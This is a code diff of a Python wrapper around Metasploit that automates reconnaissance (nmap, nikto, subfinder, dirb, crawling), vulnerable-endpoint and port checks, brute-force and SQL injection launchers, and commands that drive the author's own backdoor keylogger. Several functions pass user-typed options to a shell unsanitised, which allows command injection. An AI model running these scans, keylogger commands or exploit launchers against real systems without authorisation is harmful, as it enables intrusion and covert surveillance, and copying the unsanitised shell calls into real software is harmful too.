-            elif validators.url(ip):
+            if url_input:
+                ip = url_input
+                url_input = None  # Reset url_input after first use
+            else:
+                ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ").strip()
+                if not ip:
+                    return  # Exit the function if the user presses Enter without inputting anything
+
+            if validators.url(ip):
                 hostname = urllib.parse.urlsplit(ip).hostname
                 if hostname is None:
                     print("[-] Invalid URL entered. Please try again.")
                     continue
-
-                while True:
-                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
-                    if not additional_options:
-                        command = f"nmap -p- -sC -sV {hostname}"
-                    elif additional_options.lower() == "-h":
-                        command = "nmap -h"
-                    else:
-                        command = f"nmap {additional_options} {hostname}"
-
-                    print()
-                    print(command)
-                    print()
-                    try:
-                        subprocess.call(command, shell=True)
-                    except subprocess.CalledProcessError as e:
-                        print(f"[-] Error running command: {e}")
-
-                    # Break the inner loop only if valid options were provided
-                    if additional_options.lower() != "-h":
-                        break
-
+                scan_target = hostname
             elif validate_ip_address(ip):
-                while True:
-                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
-                    if not additional_options:
-                        command = f"nmap -p- -sC -sV {ip}"
-                    elif additional_options.lower() == "-h":
-                        command = "nmap -h"
-                    else:
-                        command = f"nmap {additional_options} {ip}"
-
-                    print()
-                    print(command)
-                    print()
-                    try:
-                        subprocess.call(command, shell=True)
-                    except subprocess.CalledProcessError as e:
-                        print(f"[-] Error running command: {e}")
-
-                    # Break the inner loop only if valid options were provided
-                    if additional_options.lower() != "-h":
-                        break
-
+                scan_target = ip
             else:
                 print("[-] Invalid IP or URL entered. Please try again.")
                 continue
 
+            while True:
+                additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ").strip()
+                if not additional_options:
+                    command = f"nmap -p- -T3 --min-rate=750 -sC -sV {scan_target}"
+                elif additional_options.lower() == "-h":
+                    command = "nmap -h"
+                else:
+                    command = f"nmap {additional_options} {scan_target}"
+
+                print(f"\n{command}\n")
+                try:
+                    subprocess.call(command, shell=True)
+                except subprocess.CalledProcessError as e:
+                    print(f"[-] Error running command: {e}")
+
+                # Break the inner loop only if valid options were provided
+                if additional_options.lower() != "-h":
+                    break
+
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
-def ping():
+def ping(url_input):
+    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
     try:
+        if globaltargetenabled:
+            if target_is_url:
+                ip = globaltarget
+                hostname = urllib.parse.urlsplit(ip).hostname
+                command = f"nmap -sn {hostname}"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+            elif target_is_ip:
+                ip = globaltarget
+                command = f"nmap -sn {ip}"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+
         while True:
-            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
-            if not ip:
-                break
-            elif validators.url(ip):
+            if url_input:
+                ip = url_input
+                url_input = None  # Reset url_input after first use
+            else:
+                ip = input_with_backspace("\nIP address or URL to ping (Press enter to exit)> ").strip()
+                if not ip:
+                    return  # Exit the function if the user presses Enter without inputting anything
+
+            if validators.url(ip):
                 hostname = urllib.parse.urlsplit(ip).hostname
                 if hostname is None:
                     print("[-] Invalid URL entered. Please try again.")
                     continue
                 command = f"nmap -sn {hostname}"
+            elif validate_ip_address(ip):
+                command = f"nmap -sn {ip}"
             else:
-                if validate_ip_address(ip):
-                    command = f"nmap -sn {ip}"
-                else:
-                    print("[-] Invalid IP or URL entered. Please try again.")
-                    continue
-            print()
-            print(command)
-            print()
+                print("[-] Invalid IP or URL entered. Please try again.")
+                continue
+
+            print(f"\n{command}\n")
             try:
                 subprocess.call(shlex.split(command))
             except subprocess.CalledProcessError as e:
                 print(f"[-] Error running command: {e}")
+
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
-def sbust():
+def sbust(url_input):
+    global globaltarget, globaltargetenabled, target_is_url
+
     try:
+        # Check if global target is enabled and is a URL
+        if globaltargetenabled:
+            if target_is_url:
+                try:
+                    ip = globaltarget
+                    hostname = urllib.parse.urlsplit(ip).hostname
+                    command = f"subfinder -t 16 -d {hostname}"
+                    print(f"\n{command}\n")
+                    subprocess.call(command, shell=True)
+                except KeyboardInterrupt:
+                    print("\nKeyboard interrupt detected. Exiting...\n")
+                except Exception as e:
+                    print(f"Error: {e}")
+            else:
+                print("\n[-] This module requires the target to be a URL")
+            return
+
+        # Loop for user input if global target is not used
         while True:
-            ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
-            if not ip:
-                break
-            while not validators.url(ip):
+            if url_input:
+                ip = url_input
+                url_input = None  # Reset url_input after first use
+            else:
+                ip = input_with_backspace("\nURL to scan (Press enter to exit)> ").strip()
+                if not ip:  # Check if the input is empty
+                    return  # Exit the function if the input is empty
+
+            if validators.url(ip):
+                hostname = urllib.parse.urlsplit(ip).hostname
+                command = f"subfinder -t 16 -d {hostname}"
+                print(f"\n{command}\n")
+                try:
+                    subprocess.call(command, shell=True)
+                except subprocess.CalledProcessError as e:
+                    print(f"[-] Error running command: {e}")
+            else:
                 print("[-] Invalid URL entered. Please try again.")
-                ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
-                if not ip:
-                    break
-            if not ip:
-                break
 
-            hostname = urllib.parse.urlsplit(ip).hostname
-
-            command = f"python3 sublist3r.py -t 16 -d {hostname}"
-
-            print()
-            print(command)
-            print()
-            try:
-                subprocess.call(shlex.split(command))
-            except subprocess.CalledProcessError as e:
-                print(f"[-] Error running command: {e}")
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
-
-def sbrute():
-    try:
-        while True:
-            ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
-            if not ip:
-                break
-            while not validators.url(ip):
-                print("[-] Invalid URL entered. Please try again.")
-                ip = input_with_backspace("URL to scan (Press enter to exit)> ")
-                if not ip:
-                    break
-            if not ip:
-                break
-
-            hostname = urllib.parse.urlsplit(ip).hostname
-            command = f"python3 subbrute.py {hostname}"
-
-            print()
-            print(command)
-            print()
-            try:
-                subprocess.call(shlex.split(command))
-            except subprocess.CalledProcessError as e:
-                print(f"[-] Error running command: {e}")
-    except KeyboardInterrupt:
-        print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
         
-def vulnwebnikto():
+def vulnwebnikto(url_input):
+    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
     try:
+        if globaltargetenabled:
+            if target_is_url:
+                ip = globaltarget
+                hostname = urllib.parse.urlsplit(ip).hostname
+                command = f"nikto -h {hostname} -Display 4P -C all"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+            elif target_is_ip:
+                ip = globaltarget
+                command = f"nikto -h {ip} -Display 4P -C all"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+
         while True:
-            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
-            if not ip:
-                break
-            elif validators.url(ip):
+            if url_input:
+                ip = url_input
+                url_input = None  # Reset url_input after first use
+            else:
+                ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ").strip()
+                if not ip:
+                    return  # Exit the function if the user presses Enter without inputting anything
+
+            if validators.url(ip):
                 hostname = urllib.parse.urlsplit(ip).hostname
                 if hostname is None:
                     print("[-] Invalid URL entered. Please try again.")
                     continue
 
                 while True:
-                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
+                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ").strip()
                     if not additional_options:
                         command = f"nikto -h {hostname} -Display 4P -C all"
                     elif additional_options.lower() == "-h":
@@ -901,9 +2318,7 @@ def vulnwebnikto():
                     else:
                         command = f"nikto {additional_options} {hostname}"
 
-                    print()
-                    print(command)
-                    print()
+                    print(f"\n{command}\n")
                     try:
                         subprocess.call(command, shell=True)
                     except subprocess.CalledProcessError as e:
@@ -915,7 +2330,7 @@ def vulnwebnikto():
 
             elif validate_ip_address(ip):
                 while True:
-                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ")
+                    additional_options = input_with_backspace(f"Options/Parameters (-h for list. Press enter for default): ").strip()
                     if not additional_options:
                         command = f"nikto -h {ip} -Display 4P -C all"
                     elif additional_options.lower() == "-h":
@@ -923,9 +2338,7 @@ def vulnwebnikto():
                     else:
                         command = f"nikto {additional_options} {ip}"
 
-                    print()
-                    print(command)
-                    print()
+                    print(f"\n{command}\n")
                     try:
                         subprocess.call(command, shell=True)
                     except subprocess.CalledProcessError as e:
@@ -941,130 +2354,132 @@ def vulnwebnikto():
 
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
-def vulnwebzap():
-    print("\n**OUTFILE OR OWASP GUI IS RECOMMENDED**")
-    allowed_extensions = (".html", ".json", ".md", ".xml")
+def vulnport(url_input):
+    global globaltarget, globaltargetenabled, target_is_url, target_is_ip
+
     try:
+        if globaltargetenabled:
+            if target_is_url:
+                ip = globaltarget
+                hostname = urllib.parse.urlsplit(ip).hostname
+                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {hostname}"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+            elif target_is_ip:
+                ip = globaltarget
+                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {ip}"
+                print(f"\n{command}\n")
+                subprocess.call(command, shell=True)
+                return
+
         while True:
-            ip = input_with_backspace("\nURL to scan (Press enter to exit)> ")
-            if not ip:
-                break
-            while not validators.url(ip):
-                print("[-] Invalid URL entered. Please try again.")
-                ip = input_with_backspace("URL to scan (Press enter to exit)> ")
-                if not ip:
-                    break
-            if not ip:
-                break
-            zap_dir = ""
-            while not zap_dir:
-                zap_dir = input_with_backspace("Directory containing zap.sh (Press enter for default /usr/share/zaproxy/): ")
-                if not zap_dir:
-                    zap_dir = "/usr/share/zaproxy/"
-                zap_path = os.path.join(zap_dir, "zap.sh")
-                try:
-                    with open(zap_path):
-                        pass
-                except FileNotFoundError:
-                    print(f"[-] zap.sh not found in {zap_dir}. Please try again.")
-                    zap_dir = ""
-
-            save = None
-            while save is None:
-                save = input_with_backspace("save output with filename (Press enter for N/A): ")
-                if not save:
-                    break
-                if not save.endswith(allowed_extensions):
-                    print(f"[-] Invalid file extension. Accepted file types are .html, .json, .md, and .xml.")
-                    save = None
-
-            if save is None:
-                command = f"{zap_dir}./zap.sh -quickurl {ip} -quickprogress -cmd -silent"
+            if url_input:
+                ip = url_input
+                url_input = None  # Reset url_input after first use
             else:
-                command = f"{zap_dir}./zap.sh -quickurl {ip} -quickout ~/{save} -quickprogress -cmd -silent"
-            print()
-            print(command)
-            print()
-            try:
-                subprocess.call(shlex.split(command))
-            except subprocess.CalledProcessError as e:
-                print(f"[-] Error running command: {e}")
-    except KeyboardInterrupt:
-        print("\nKeyboard interrupt detected. Exiting...\n")
+                ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ").strip()
+                if not ip:
+                    return  # Exit the function if the user presses Enter without inputting anything
 
-def vulnport():
-    try:
-        while True:
-            ip = input_with_backspace("\nIP address or URL to scan (Press enter to exit)> ")
-            if not ip:
-                break
-            elif validators.url(ip):
+            if validators.url(ip):
                 hostname = urllib.parse.urlsplit(ip).hostname
                 if hostname is None:
                     print("[-] Invalid URL entered. Please try again.")
                     continue
-                command = f"nmap -p- -sV --script vuln {hostname}"
+                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {hostname}"
+            elif validate_ip_address(ip):
+                command = f"nmap -p- -sV -T3 --min-rate=750 --script vuln {ip}"
             else:
-                if validate_ip_address(ip):
-                    command = f"nmap -p- -sV --script vuln {ip}"
-                else:
-                    print("[-] Invalid IP or URL entered. Please try again.")
-                    continue
-            print()
-            print(command)
-            print()
+                print("[-] Invalid IP or URL entered. Please try again.")
+                continue
+
+            print(f"\n{command}\n")
             try:
                 subprocess.call(shlex.split(command))
             except subprocess.CalledProcessError as e:
                 print(f"[-] Error running command: {e}")
+
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
-def dbust():
+def dbust(url_input):
+    global globaltarget, globaltargetenabled, target_is_url, dirb_default_wordlist
     print("**FUZZ ENUMERATES MUCH FASTER**")
 
-    while True:  # Infinite loop to keep asking for URLs until the user exits
-        try:
-            while True:
-                url = input_with_backspace("\nURL to scan (Press enter to exit)> ")
-                if not url:
-                    return  # If the user presses Enter without entering a URL, exit the loop
-                if validators.url(url):
-                    break  # Exit the loop if a valid URL is provided
-                print("[-] Invalid input. Please enter a valid URL (e.g., https://example.com/).")
-
-            while True:
-                custom_wordlist = input_with_backspace("Custom wordlist (Press enter for default): ")
-                if custom_wordlist == "":
-                    custom_wordlist = "/usr/share/dirb/wordlists/common.txt"  # ***Default wordlist value*** set to whatever you want.
-                    break  # Exit the loop if the user presses enter (default wordlist)
+    try:
+        if globaltargetenabled:
+            if target_is_url:
+                ip = globaltarget
+                command = f"dirb {ip} -r {dirb_default_wordlist}"
+                print(f"\n{command}\n")
                 try:
-                    with open(custom_wordlist):
-                        break  # Exit the loop if the file is found
-                except FileNotFoundError:
-                    print(f"[-] {custom_wordlist} not found. Please try again.")
-
-            while True:
-                additional_options = input_with_backspace("Additional options (-h for list. Press enter for default): ")
-                if additional_options.lower() == "-h":
-                    command = "dirb"
-                    print()
-                    subprocess.call(command, shell=True)
-                else:
-                    command = f"dirb {url} {custom_wordlist} {additional_options}"
-                    print()
-                    print(command)
-                    print()
-                    subprocess.call(command, shell=True)
-                if additional_options.lower() != "-h":
-                    break
-
-        except KeyboardInterrupt:
-            print("\nKeyboard interrupt detected. Exiting...\n")
+                    subprocess.call(shlex.split(command))
+                    return
+                except subprocess.CalledProcessError as e:
+                    print(f"[-] Error running command: {e}")
+                    return
+            print("\n[-] this module requires the target to be a URL")
             return
 
-def spider():
+        while True:  # Infinite loop to keep asking for URLs until the user exits
+            if url_input:
+                url = url_input
+                url_input = None  # Reset url_input after first use
+            else:
+                url = input_with_backspace("\nURL to scan (Press enter to exit)> ").strip()
+                if not url:
+                    return  # If the user presses Enter without entering a URL, exit the loop
+
+            if validators.url(url):
+                break  # Exit the loop if a valid URL is provided
+            else:
+                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+
+        while True:
+            custom_wordlist = input_with_backspace("Custom wordlist (Press enter for default): ").strip()
+            if not custom_wordlist:
+                custom_wordlist = dirb_default_wordlist  # Default wordlist value
+                break  # Exit the loop if the user presses enter (default wordlist)
+            try:
+                with open(custom_wordlist):
+                    break  # Exit the loop if the file is found
+            except FileNotFoundError:
+                print(f"[-] {custom_wordlist} not found. Please try again.")
+
+        while True:
+            additional_options = input_with_backspace("Additional options (-h for list. Press enter for default): ").strip()
+            if additional_options.lower() == "-h":
+                command = "dirb"
+                print()
+                subprocess.call(command, shell=True)
+            else:
+                command = f"dirb {url} {custom_wordlist} {additional_options}"
+                print(f"\n{command}\n")
+                try:
+                    subprocess.call(shlex.split(command))
+                except subprocess.CalledProcessError as e:
+                    print(f"[-] Error running command: {e}")
+            if additional_options.lower() != "-h":
+                break
+
+    except KeyboardInterrupt:
+        print("\nKeyboard interrupt detected. Exiting...\n")
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+def spider(url_input):
     while True:  # Infinite loop to keep asking for URLs until the user exits
         try:
             while True:
@@ -1072,7 +2487,7 @@ def spider():
                 if not target_url:
                     return  # If the user presses Enter without entering a URL, exit the loop
                 if not validators.url(target_url):
-                    print("[-] Invalid input. Please enter a valid URL (e.g., https://example.com/).")
+                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
                 else:
                     break
 
@@ -1140,6 +2555,47 @@ def spider():
         except KeyboardInterrupt:
             print("\nKeyboard interrupt detected. Exiting...\n")
             return
+        except Exception as e:
+            color = "\033[93m"
+            reset_color = "\033[0m"
+            print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+def default_spider(domain):
+    output_file = "/home/kali/VforMSF/temp/spider_output.txt"
+    depth = 5  # Default crawl depth
+    target_links = []
+    print("\n[+] Crawling", domain, "up to depth", depth)
+    def extract_links_from(url):
+        try:
+            response = requests.get(url, allow_redirects=True)
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Failed to retrieve links from {url}: {e}")
+            return []
+
+        # Extract all links from the page
+        return re.findall('(?:href|src)="(.*?)"', response.content.decode(errors="ignore"))
+
+    def crawl(url, depth, file):
+        base_url = urllib.parse.urljoin(url, "/")
+        if url in target_links:
+            return
+        target_links.append(url)
+        print(f"{url}")
+        file.write(url + "\n")
+        if depth > 1:
+            href_links = extract_links_from(url)
+            for link in href_links:
+                link = urllib.parse.urljoin(url, link)
+                if "#" in link:
+                    link = link.split("#")[0]
+                if domain in link and link not in target_links and base_url in link:
+                    crawl(link, depth=depth-1, file=file)
+
+    with open(output_file, "a") as file:
+        file.write(f"[+] Crawling {domain} up to depth {depth}\n")
+        crawl(domain, depth, file)
+        file.write("[+] Crawling complete!\n")
+    print("\n[+] Crawling complete! Output saved to spider_output.txt")
 
 def input_with_backspace(prompt=''):
     readline.set_startup_hook(lambda: readline.insert_text(''))
@@ -1203,7 +2659,10 @@ def arp_function():
 
         except KeyboardInterrupt:
             print("\nKeyboard interrupt detected. Exiting...\n")
-            return
+        except Exception as e:
+            color = "\033[93m"
+            reset_color = "\033[0m"
+            print(f"{color}[-] An error occurred: {e}{reset_color}")
     
 def change_mac(adapter, address):
     subprocess.call(["ifconfig", adapter, "down"])
@@ -1286,7 +2745,10 @@ def get_input():
 
     except KeyboardInterrupt:
         print("\nKeyboard interrupt detected. Exiting...\n")
-        return
+    except Exception as e:
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] An error occurred: {e}{reset_color}")
 
 def is_valid_adapter(adapter_name):
     # Execute the appropriate command to check if the adapter exists on Linux
@@ -1308,14 +2770,148 @@ def start_msf():
         
     except subprocess.CalledProcessError as e:
         print(f"[-] An error occurred while starting msfconsole.\n")
-        print(f"{e}")
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] {e}{reset_color}")
     except Exception as e:
         print(f"[-] An error occurred while starting msfconsole.\n")
-        print(f"{e}")
+        color = "\033[93m"
+        reset_color = "\033[0m"
+        print(f"{color}[-] {e}{reset_color}")
         
 def strip_ansi_sequences(text):
     ansi_escape_pattern = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
     return ansi_escape_pattern.sub('', text)
+
+def checkendpoints_main(url_input):
+    global globaltarget, globaltargetenabled, limitloop
+    print(f"*Checks for potentially vulnerable endpoints*")
+
+    while True:  # Infinite loop to keep asking for URLs until the user exits
+        if globaltargetenabled:
+            if not limitloop:
+                if target_is_url:
+                    url = globaltarget
+                    domain = globaltarget
+                    hostname = urllib.parse.urlsplit(domain).hostname
+                    limitloop = True
+                    break
+                print("")
+                print("[-] this module requires the target to be a URL")
+                return
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] completed{reset_color}")
+            limitloop = False
+            return
+        else:
+            if url_input:
+                url = url_input
+                url_input = None  # Reset url_input after first use
+            else:
+                url = input_with_backspace("\nURL to check (Press enter to exit)> ").strip()
+                if not url:
+                    return  # If the user presses Enter without entering a URL, exit the loop
+
+            if validators.url(url):
+                domain = url
+                hostname = urllib.parse.urlsplit(domain).hostname
+                break  # Exit the loop if a valid URL is provided
+            else:
+                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+
+    def run_check(description, filename):
+        try:
+            print(f"\n[+] {description}")
+            check_endpoints(domain, filename)
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] completed{reset_color}")
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            color = "\033[93m"
+            reset_color = "\033[0m"
+            print(f"{color}[-] An error occurred: {e}{reset_color}")
+
+    # List of descriptions and files to check
+    checks = [
+        ("Checking SQL Endpoints...\n", sql_endpoints_file),
+        ("Checking LFI Endpoints...\n", lfi_endpoints_file),
+        ("Checking Deserialization Endpoints...\n", deserialization_endpoints_file),
+        ("Checking File Upload Endpoints...\n", upload_endpoints_file),
+        ("Checking Misc Interesting Endpoints...\n", misc_vuln_endpoints),
+        ("...More Misc Endpoints...\n", misc_vuln_endpoints_2),
+        #("Checking Interesting Endpoints with Known Paths...\n", endpoints_with_paths),
+    ]
+
+    # Use ThreadPoolExecutor to manage threads
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = [executor.submit(run_check, description, filename) for description, filename in checks]
+    
+        # Wait for all threads to complete
+        for future in futures:
+            future.result()
+
+def checkports_main(url_input):
+    global globaltarget, globaltargetenabled, limitloop
+    print(f"*Checks for open ports (common)*")
+
+    while True:
+        while True:
+            if not limitloop:
+                if globaltargetenabled:
+                    if target_is_url:
+                        url = globaltarget
+                        domain = globaltarget
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
+                        break
+                    print("")
+                    print("[-] this module requires the target to be a URL")
+                    return
+                if url_input:
+                    url = url_input
+                    if validators.url(url):
+                        domain = url
+                        hostname = urllib.parse.urlsplit(domain).hostname
+                        limitloop = True
+                        break  # Exit the loop if a valid URL is provided
+                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+                    return
+                else:
+                    url = input_with_backspace("\nURL to check (Press enter to exit)> ")
+                if not url:
+                    return  # If the user presses Enter without entering a URL, exit the loop
+                if validators.url(url):
+                    domain = url
+                    hostname = urllib.parse.urlsplit(domain).hostname
+                    break  # Exit the loop if a valid URL is provided
+                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
+            print("")
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            print(f"{color}[+] completed{reset_color}")
+            limitloop = False
+            return
+
+        try:
+            print(" ")
+            print("[+] Checking Common Ports...")
+            open_ports, closed_ports = check_smb_ports(domain)
+            color = "\033[92m"
+            reset_color = "\033[0m"
+            if open_ports:
+                for port, description in open_ports:
+                    print(f"{color}[+] Port {port} ({description}) is OPEN{reset_color}")
+        except KeyboardInterrupt:
+            print("[-] KeyboardInterrupt detected. Moving on...")
+            print(" ")
+        except Exception as e:
+            color = "\033[93m"
+            reset_color = "\033[0m"
+            print(f"{color}[-] An error occurred: {e}{reset_color}")
         
 def main():
     # Set up initial pseudoterminal and msfconsole process
@@ -1338,7 +2934,7 @@ def main():
         inmodule = False
         modulepattern = r'\b(exploit|auxiliary|post|payload|encoder|nop|evasion)\((.*?)\)'
         ligoloup = False
-    with open("msf_log.txt", "a") as log_file:
+    with open("command_log.txt", "a") as log_file:
         try:
             while True:
                 # Wait for data to become available on the master end of the PTY or stdin
@@ -1353,9 +2949,11 @@ def main():
                         # Check if the output indicates that msfconsole is ready
                         if first_launch:
                             load_metasploit_params()
-                            print("[+] Successfully loaded VforMSF extensions")
+                            color = "\033[92m"
+                            reset_color = "\033[0m"
+                            print(f"{color}[+] Successfully loaded VforMSF extensions{reset_color}")
                             first_launch = False
-                            
+
                         if re.search(modulepattern, output):
                             inmodule = True
                         else:
@@ -1363,13 +2961,19 @@ def main():
 
                     elif r == sys.stdin:
                         user_input = sys.stdin.readline()
-                        log_file.write(user_input)
-                        log_file.flush()
+                        command_log = user_input.strip()
+                        if command_log:
+                            log_file.write(command_log + "\n")
+                            log_file.flush()
+
+                        if globaltarget:
+                            limitloop = False
+
                         if user_input.lower().strip() == "exit":
-                            os.write(master, b"exit\n")
-                            sys.exit()
                             if ligoloup:
                                subprocess.call(['sudo ip link delete ligolo'])
+                            os.write(master, b"exit\n")
+                            sys.exit()
 
                         elif user_input.lower().startswith("use "):
                             os.write(master, user_input.encode())
@@ -1387,18 +2991,41 @@ def main():
                                send_metasploit_commands(master)
                                defaultset = True
 
-
                         elif user_input.lower().startswith("update config"):
-                            update_metasploit_params()
+                            try:
+                                update_metasploit_params()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
 
                         elif user_input.lower().startswith("show config"):
-                            print_current_defaults()
+                            try:
+                                print_current_defaults()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
 
                         elif user_input.lower().startswith("load config"):
-                            load_metasploit_params()
+                            try:
+                                load_metasploit_params()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
 
                         elif user_input.lower().startswith("save config"):
-                            save_metasploit_params()
+                            try:
+                                save_metasploit_params()
+                            except KeyboardInterrupt:
+                                print("[-] KeyboardInterrupt detected. Moving on...")
+                                print(" ")
+                            except Exception as e:
+                                print(f"[-] Error occurred during scan: {e}")
 
                         elif user_input.lower().startswith("upgrade"):
                             session = int(input("session: "))
@@ -1438,6 +3065,26 @@ def main():
                             os.write(master, f"set session {session}\n".encode())
                             os.write(master, f"exploit\n".encode())
 
+                        elif user_input.lower().startswith("schedule"):
+                            try:
+                                parts = user_input.split(" ", 2)
+                                if len(parts) < 3:
+                                    print("[-] Invalid input. Use 'schedule [delay(seconds)] [command]'.")
+                                    continue
+
+                                delay_input = parts[1].strip().lower()
+                                command = parts[2].strip()
+
+                                if not delay_input.isdigit():
+                                    print("[-] Delay must be a valid number in seconds.")
+                                    continue
+
+                                delay_seconds = int(delay_input)
+
+                                schedule_command_with_delay(command, delay_seconds, master)
+                            except Exception as e:
+                                print(f"[-] An error occurred: {e}")
+
                         elif user_input.lower().startswith("help"):
                             if not re.search(r"msf", output): #for my reverse shell, comment out if it bothers you
                                 os.write(master, b"shelp\n")
@@ -1449,6 +3096,7 @@ def main():
 
                         elif user_input.lower().startswith("vhelp"):
                             print("\n**CURRENT COMMAND & AVAILABLE MODULES:**\n")
+                            print()
 
                             print("**SELF COMMANDS:**")
                             print("  -vbanner *Displays our awesome banner*")
@@ -1459,8 +3107,14 @@ def main():
 
                             print("**UTILITY COMMANDS:**")
                             print("  -bash *Enters a bash terminal. The script is still running. Use exit to return*")
+                            print("  -qrcode *generates a qrcode for any reason you might want to*")
+                            print("  -schedule *delay in seconds* *msfcommand* *schedules a console command to be run at a later time*")
+                            print("  -show schedule *displays the scheduled commands*")
+                            print("  -cancel last/all *cancel scheduled commands*")
                             print("  -chmac *Changes your MAC address. (Needs Root)*")
                             print("  -generate *generates a reverse shell utilizing msfvenom*")
+                            print("  -checkall *Utilizes default values to preform a series of checks and scans on a target website*")
+                            print("  -enable/disable defaults *Sets the target and enables utilization of all default values*")
                             print()
 
                             print("**NETWORK DISCOVERY COMMANDS:**")
@@ -1473,19 +3127,21 @@ def main():
                             print("  -spider *Crawls the HTML of a target website for interesting endpoints such as .js*")
                             print("  -dbust *Performs directory busting utilizing dirb to look for hidden directories on a target website.*")
                             print("  -fuzz *Utilizes ffuf to quickly enumerate endpoints on a target website.*")
-                            print("  -sbust *Performs quick subdomain busting utilizing Sublist3r to look for subdomains on a target website.*")
-                            print("  -sbrute *Performs subdomain busting utilizing subbrute with a wordlist to look for subdomains on a target website.*")
+                            print("  -sbust *Performs quick subdomain busting utilizing Subfinder to look for subdomains on a target website.*")
+                            print("  -checkendpoints *Uses a wordlist to check for commonly vulnerable endpoints on the target website*")
+                            print("  -checkports *quickly checks for open ports on a target website*")
                             print()
 
                             print("**VULNERABILITY SCANNING COMMANDS:**")
-                            print("  -vulnwebzap *Calls owasp-zap for web app vulnerability scanning.*")
                             print("  -vulnwebnikto *Calls nikto for web app vulnerability scanning.*")
                             print("  -vulnport *Calls nmap vulners for port based vulnerability scanning.*")
+                            print("  -checkexploits *Checks to see if the target website is vulnerable to one of our exploit scripts.*")
                             print()
 
                             print("**EXPLOITATION MODULES:**")
-                            print("  -login' *Utilizes hydra to preform a brute force attack on a login point.*")
+                            print("  -login *Utilizes hydra to preform a brute force attack on a login point.*")
                             print("  -sqli *Utilizes sqlmap to attempt sql injection on a target website.*")
+                            print("  -vsearch *keywords* *searches our directory of exploit scripts to then execute*")
                             print()
 
                             print("**METASPLOIT ADDITIONS AND AUTOMATION:**")
@@ -1506,10 +3162,49 @@ def main():
                                 os.system('clear')
                             except Exception as e:
                                 print(f"[-] Error occurred during scan: {e}")
+
+                        elif user_input.lower().startswith("startkeylog"):
+                        #This interacts with my personal backdoor so I do not have to use multihandlers functionality
+                        #comment it out if it bothers you
+                            if not re.search(r"msf", output):
+                                try:
+                                    os.write(master, b"startkeylog\n")
+                                    color = "\033[92m"
+                                    reset_color = "\033[0m"
+                                    print(f"{color}[+] logging keystrokes{reset_color}")
+                                except Exception as e:
+                                    print(f"[-] Error occurred: {e}")
+                            else:
+                                print(f"[-] Non interactive state detected. Please enter an active session")
+                        
+                        elif user_input.lower().startswith("stopkeylog"):
